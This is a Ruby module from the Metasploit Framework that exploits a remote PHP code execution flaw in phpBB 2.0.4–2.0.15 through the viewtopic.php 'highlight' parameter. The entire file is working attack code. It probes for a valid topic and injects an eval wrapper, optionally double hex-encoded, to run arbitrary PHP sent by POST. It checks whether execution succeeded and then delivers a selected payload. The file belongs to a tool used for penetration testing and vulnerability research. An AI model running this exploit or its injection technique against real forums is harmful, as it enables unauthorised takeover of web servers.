##
# $Id: phpbb_highlight.rb 12540 2011-05-04 20:43:19Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'phpBB viewtopic.php Arbitrary Code Execution',
			'Description'    => %q{
					This module exploits two arbitrary PHP code execution flaws in the
				phpBB forum system. The problem is that the 'highlight' parameter
				in the 'viewtopic.php' script is not verified properly and will
				allow an attacker to inject arbitrary code via preg_replace().

				This vulnerability was introduced in revision 3076, and finally
				fixed in revision 5166. According to the "tags" within their tree,
				this corresponds to versions 2.0.4 through 2.0.15 (inclusive).
			},
			'Author'         => [ 
								'valsmith[at]metasploit.com', 
								'hdm', 
								'patrick', 
								'James Bercegay ( http://www.gulftech.org/ )' 
								# June 05, 2011
								# - Added ARCH_PHP compatibility
								# - Cleaned up , and commented code in order to help aid 
								#   future development.
								# - Added "check" method
								# - Replaced "phpinfo()" test, as many hosts block requests
								#   that contain the string "phpinfo()"
								# - Changed the payload delivery to POST, as any overly long
								#   GET requests can cause requests to exceed server limits
								],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12540 $',
			'References'     =>
				[
					[ 'CVE', '2005-2086'],
					[ 'CVE', '2004-1315'],
					[ 'OSVDB', '11719'],
					[ 'OSVDB', '17613'],
					[ 'BID', '14086'],
					[ 'BID', '10701'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
				},
			'Platform'       => 'php',
			'Arch'           =>  ARCH_PHP,
			'Targets'        =>
				[
					[ 'Automatic', 		{ }],
					[ 'phpbb <=2.0.10', 	{ }],
					[ 'phpbb <=2.0.15', 	{ }],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [true, "The phpBB root Directory", "/phpBB2"]),
				OptString.new('TOPIC', [false, "The ID of a valid topic"]),
				OptInt.new('RLIM', [false, 'Random string limit',  8 ]),
			], self.class)
	end
	
	# PHP chr encoding
	def get_php_chr(data)
		
		# Encode the data
		data = data.unpack("C*").collect{|x| "chr(#{x})"}.join(".")
		
		# Returned
		return data
	end

	# Find a valid topic
	def find_topic

		1.upto(32) do |x|

		res = send_request_raw({
				'uri'	=> datastore['URI'] + '/viewtopic.php?topic=' + x.to_s,
			}, 25)

		if (res and res.body.match(/class="postdetails"/))
			print_status("Discovered valid topic ID: #{x}")
			return x
		end

		end
		return false

	end
	
	# Execute the selected PHP code
	def exec_php(code, dhex = nil)
		
		# Make sure a topic id has been specified
		datastore['TOPIC'] = datastore['TOPIC'] || find_topic

		# No topic
		if !(datastore['TOPIC'])
			print_error("No valid topic ID found, please specify the TOPIC option.")
			return
		end
	
		# Name of $_POST var used
		pvar = rand_text_alpha(datastore['RLIM'])
		
		# Base query string used to trigger the bug
		qstr = "/viewtopic.php?t=#{datastore['TOPIC']}&highlight="
		
		# Simple wrapper used for delivering the payload
		wrap = "'.@eval($_POST[#{pvar}]).'" # Split for usability
		wrap = Rex::Text.uri_encode(wrap).gsub(/\./, '%2e')
		
		# Double hex
		if ( dhex )
			
			# Double encodes chars
			wrap.gsub!(/%/, '%25')
		end	
		
		# Post data
		data = "#{pvar}=#{Rex::Text.uri_encode(code)};"

		# Execute selected code
		resp = send_request_raw({
			'uri'     => datastore['URI'] + qstr + wrap,
			'method'  => 'POST',
			'data'    => data,
			'headers' => 
			{
				"Content-Type" => "application/x-www-form-urlencoded",
				"Content-Length" => data.length,
			}
			}, 25)
			
			# Return the response
			return ( resp && resp.body ) ? resp.body: nil
	end
	
	def check

		# Random string
		rand = rand_text_alpha(datastore['RLIM'])
	
		# Test expression to confirm execution
		tphp = "printf(#{get_php_chr(rand)});"

		# Target select
		case target.name
		
		# Automatic target
		when /Automatic/

			# Verbose
			print_status("Trying to determine which attack method to use...")

			# Standard hex encoded vector ( phpBB <= 2.0.15 )
			if ( exec_php(tphp) =~ /#{rand}/ )
				
				# Success!
				print_good("Code execution confirmed using standard hex encoding")
				return Exploit::CheckCode::Vulnerable
				
			# Double hex encoded vector ( phpBB <= 2.0.10 )
			elsif ( exec_php(tphp, 1) =~ /#{rand}/ )
			
				# Success!
				print_good("Code execution confirmed using double hex encoding")
				return Exploit::CheckCode::Vulnerable
				
			else
				# Failiure
				print_error("Unable to confirm PHP code execution. Exploit failed!")
				return Exploit::CheckCode::Safe			
			end

		# Double hex
		when /2\.0\.10/
		
			# Double hex encoded vector ( phpBB <= 2.0.10 )
			if ( exec_php(tphp, 1) =~ /#{rand}/ )
				
				# Success!
				print_good("Code execution confirmed using double hex encoding")
				return Exploit::CheckCode::Vulnerable
			end
		
		# Standard hex
		when /2\.0\.15/
		
			# Standard hex encoded vector ( phpBB <= 2.0.15 )
			if ( exec_php(tphp) =~ /#{rand}/ )
				
				# Success!
				print_good("Code execution confirmed using standard hex encoding")
				return Exploit::CheckCode::Vulnerable
			end
		end
		
		# Not vulnerable
		return Exploit::CheckCode::Safe			
	end
	
	def exploit
		
		# Random string
		rand = rand_text_alpha(datastore['RLIM'])
	
		# Test expression to confirm execution
		tphp = "printf(#{get_php_chr(rand)});"

		# Target select
		case target.name
		
		# Automatic target
		when /Automatic/

			# Verbose
			print_status("Trying to determine which attack method to use...")

			# Standard hex encoded vector ( phpBB <= 2.0.15 )
			if ( exec_php(tphp) =~ /#{rand}/ )
				
				# Success!
				print_good("Code execution confirmed using standard hex encoding")
				print_status("Now attempting to execute the selected payload")
				
				# Payload
				exec_php(payload.encoded)
				handler				
				
			# Double hex encoded vector ( phpBB <= 2.0.10 )
			elsif ( exec_php(tphp, 1) =~ /#{rand}/ )
			
				# Success!
				print_good("Code execution confirmed using double hex encoding")
				print_status("Now attempting to execute the selected payload")
				
				# Payload
				exec_php(payload.encoded, 1)
				handler		
			else
				# Failiure
				print_error("Unable to confirm PHP code execution. Exploit failed!")
				return				
			end

		# Double hex
		when /2\.0\.10/
		
				# Verbose
				print_status("Using double hex encoding")
				print_status("Now attempting to execute the selected payload")
				
				# Payload
				exec_php(payload.encoded, 1)
				handler		
		
		# Standard hex
		when /2\.0\.15/
		
				# Verbose
				print_status("Using standard hex encoding")
				print_status("Now attempting to execute the selected payload")
				
				# Payload
				exec_php(payload.encoded)
				handler		
		end
	end 
end
